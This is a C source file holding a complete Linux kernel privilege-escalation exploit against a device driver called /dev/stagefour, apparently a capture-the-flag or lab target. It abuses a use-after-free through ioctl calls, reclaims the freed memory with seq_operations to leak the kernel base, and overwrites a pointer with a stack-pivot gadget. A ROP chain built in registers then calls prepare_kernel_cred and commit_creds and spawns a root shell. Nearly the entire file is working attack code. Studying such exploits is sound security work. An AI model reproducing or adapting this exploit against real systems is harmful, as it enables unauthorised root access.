#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>
#include <assert.h>
#include <sys/xattr.h>
#include <sys/prctl.h>

size_t kernel_base = 0xffffffff81000000;
#define KADDR(addr) ((size_t)(addr)-0xffffffff81000000 + kernel_base);
#define DEV_PATH "/dev/stagefour"
#define IOCTL_KALLOC 0x1770
#define IOCTL_KFREE  0x1771
#define IOCTL_READ  0x1772
#define IOCTL_WRITE 0x1773
#define STACK  0x400cc0
int fd, seq_fd;

typedef struct param{
    size_t idx;
    size_t size;
    char *buf;
} param;

void stagefour_kalloc(size_t idx, size_t size)
{
	param req;
	req.idx = idx;
	req.size = size;
	ioctl(fd, IOCTL_KALLOC, &req);
}

void stagefour_kfree(size_t idx)
{
	param req;
	req.idx = idx;
	ioctl(fd, IOCTL_KFREE, &req);
}

struct param stagefour_read(size_t idx, size_t size, char *buf)
{
	param req;
	req.idx = idx;
	req.size = size;
	req.buf = buf;
	ioctl(fd, IOCTL_READ, &req);
        return req;
}

void stagefour_write(size_t idx, size_t size, char *buf)
{
	param req;
	req.idx = idx;
	req.size = size;
	req.buf = buf;
	ioctl(fd, IOCTL_WRITE, &req);
}
 
void ppause(){
    puts("enter to unpause");
    getchar();
}

size_t user_cs, user_ss, user_rflags, user_sp, user_rip;
size_t prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode;
size_t pop_rdi_ret, mov_rdi_rax;

void spawn_shell() {
    puts("[*] Hello from user land!");
    uid_t uid = getuid();
    if (uid == 0) {
        printf("[+] UID: %d, got root!\n", uid);
        char *args[] = {"/bin/sh", NULL};
        char *env[] = {NULL};
        execve("/bin/sh", args, env); // Directly execute a shell
        perror("execve failed"); // If execve fails, print error
    } else {
        printf("[!] UID: %d, we root-less :(!\n", uid);
        exit(-1);
    }
}

void save_state() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax");
    user_rip = (size_t)spawn_shell;
    puts("[+] Saved state");
}



int main(){
  save_state();
  signal(SIGSEGV, spawn_shell); // anticipation if cannot return to userland safely as root
  fd = open(DEV_PATH, O_RDWR);
  param leak;
  size_t raw_leak, add_rsp_0xe8;
  // seq ops leak
  stagefour_kalloc(0, 0x20);
  stagefour_kfree(0);
  seq_fd = open("/proc/self/stat", O_RDONLY);
  leak = stagefour_read(0, 0x20, malloc(0x20));
  for(int i = 0; i < 0x20; i +=8){
	printf("[+] %d - 0x%016lx\n", i/8, *(long long *) (leak.buf+i));
  }

  raw_leak = *(size_t *)(leak.buf);
  kernel_base = raw_leak - 0x1da210;
  commit_creds = KADDR(0xffffffff8107e8b0);
  prepare_kernel_cred = KADDR(0xffffffff8107ecb0);
  swapgs_restore_regs_and_return_to_usermode = KADDR(0xffffffff81c00a6f);

  pop_rdi_ret = KADDR(0xffffffff81001108);
  add_rsp_0xe8 = KADDR(0xffffffff8120d02d);
  mov_rdi_rax = KADDR(0xffffffff8138dd36);
  printf("[+] seq_fd: %p\n", seq_fd);
  printf("[+] Raw leak: %p\n", raw_leak);
  printf("[+] kernel base: %p\n", kernel_base);
  printf("[+] commit_creds: %p\n", commit_creds);
  printf("[+] prepare_kernel_cred: %p\n", prepare_kernel_cred);
  printf("[+] pop_rdi_ret: %p\n", pop_rdi_ret);
  printf("[+] gadget: %p\n", add_rsp_0xe8);
  printf("[+] swapgs_restore_regs_and_return_to_usermode: %p\n", swapgs_restore_regs_and_return_to_usermode);

  *(size_t *)leak.buf = add_rsp_0xe8; //Write gadgets

  for(int i = 0; i < 0x20; i +=8){
	printf("[+] %d - 0x%016lx\n", i/8, *(long long *) (leak.buf+i));
  }

  swapgs_restore_regs_and_return_to_usermode += 0x2f; //pop +2 times
  stagefour_write(0, 0x20, leak.buf);


  __asm__(".intel_syntax noprefix;"

        "mov r15, pop_rdi_ret;"
        "mov r14, 0;"
        "mov r13, prepare_kernel_cred;"
        "mov r12, mov_rdi_rax;"
        "mov rbp, commit_creds;"
        "mov rbx, swapgs_restore_regs_and_return_to_usermode;" //pop 4 times
        "mov r11, 0;"
        "mov r10, 0x4343434343;"
        "mov r9, 0x4141414141;"
        "mov r8, 0x0;"
        "xor rax, rax;"
        "mov rcx, 0;"
        "mov rdx, 8;"
        "mov rsi, rsp;"
        "mov rdi, seq_fd;"
        "syscall;"
        ".att_syntax;");
}
